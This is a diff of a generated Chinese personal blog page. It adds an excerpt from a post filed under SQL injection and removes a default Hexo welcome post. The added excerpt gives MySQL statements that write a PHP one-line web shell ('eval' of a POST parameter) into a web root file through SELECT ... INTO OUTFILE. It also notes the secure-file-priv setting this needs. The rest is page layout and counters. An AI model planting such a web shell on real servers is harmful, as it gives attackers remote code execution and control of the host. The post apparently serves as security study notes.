+              <time title="创建时间：2020-01-14 10:44:59 / 修改时间：10:49:19" itemprop="dateCreated datePublished" datetime="2020-01-14T10:44:59+08:00">2020-01-14</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/SQL%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index">
+                    <span itemprop="name">SQL注入</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>执行语句如下：</p>
+<pre><code class="php+HTML">create table yjh(cmd varchar(50));
+insert into yjh(cmd) values(&#39;&lt;?php @eval($_POST[cmd]);?&gt;&#39;);
+select cmd from yjh into outfile &#39;D:/www/example/cmd.php&#39;;
+drop table yjh;</code></pre>
+<p>要求mysql启用secure-file-priv特性。secure-file-priv参数是用来限制LOAD DATA，SELECT … OUTFILE，LOAD_FILE()传到指定目录的，secure-file-priv状态如下：<br>● null，表示不允许导入/导出，默认状态为null；<br>● 具体目录（如/tmp/），表示限制mysql的导入/导出只发生在该目录下；<br>● 没有具体的值，表示不对mysql的导入/导出做出限制。</p>
+<p>启用secure-file-priv的方法：<br>● Windows下，修改my.cnf 在[mysqld]内加入secure_file_priv =<br>● Linux下，修改my.cnf 在[mysqld]内加入secure_file_priv =</p>
+
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/01/14/Mysql%E5%AF%BC%E5%87%BA%E4%B8%80%E5%8F%A5%E8%AF%9D/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/13/MySQL%E6%B3%A8%E5%85%A5/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -495,88 +1163,11 @@ SetHandler application/x-httpd-php
   
   
 
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/11/hello-world/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="小蚂蚁的小窝">
-      <meta itemprop="description" content="我见青山多妩媚，料青山见我应如是">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xmy's house">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/01/11/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-01-11 15:54:24" itemprop="dateCreated datePublished" datetime="2020-01-11T15:54:24+08:00">2020-01-11</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-01-10 15:21:15" itemprop="dateModified" datetime="2020-01-10T15:21:15+08:00">2020-01-10</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="bash">$ hexo new &quot;My New Post&quot;</code></pre>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="bash">$ hexo server</code></pre>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="bash">$ hexo generate</code></pre>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2020/01/11/hello-world/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
   </div>
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -642,20 +1233,20 @@ SetHandler application/x-httpd-php
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-count">21</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-count">9</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-count">9</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
